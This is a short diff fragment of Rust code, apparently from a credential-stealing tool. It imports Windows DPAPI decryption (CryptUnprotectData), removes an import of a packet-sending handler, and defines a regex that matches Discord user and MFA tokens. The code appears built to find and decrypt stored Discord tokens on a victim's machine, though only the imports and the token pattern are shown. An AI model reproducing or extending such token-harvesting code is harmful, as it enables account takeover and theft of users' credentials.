@@ -13,8 +13,6 @@ use std::thread;
 use std::time::Duration;
 use winapi::um::dpapi::CryptUnprotectData;
 use winapi::um::wincrypt::DATA_BLOB;
-use crate::handler::send_packet_sync;
-
 static DISCORD_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"mfa\.[\w-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}").unwrap()
 });
